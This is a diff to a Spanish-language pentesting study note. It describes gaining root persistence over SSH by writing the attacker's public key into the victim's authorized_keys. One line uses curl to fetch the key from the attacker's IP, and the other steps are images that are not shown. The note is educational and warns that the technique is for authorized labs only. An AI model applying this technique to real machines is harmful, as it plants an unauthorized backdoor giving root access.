@@ -1,3 +1,15 @@
+---
+title: "PERSISTENCIA SSH CON CLAVE PÚBLICA DE MÁQUINA ATACANTE"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 Podemos pasarle el id_rsa de mi máquina de atacante a la máquina remota si le pasamos el id_rsa dentro de su directorio .ssh. Por lo que primero en mi máquina atacante creamos el id_rsa:
 ![[Pasted image 20230731213220.png]]
 Le cambiamos el nombre a authorized_keys:
@@ -38,3 +50,10 @@ curl 192.168.0.20/id_ed25519.pub -o authorized_keys
 ![[Pasted image 20240423203358.png]]
 Y ahora si entramos vía ssh como root a la máquina víctima, ya hemos conseguido persistencia como root:
 ![[Pasted image 20230830085344.png]]
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
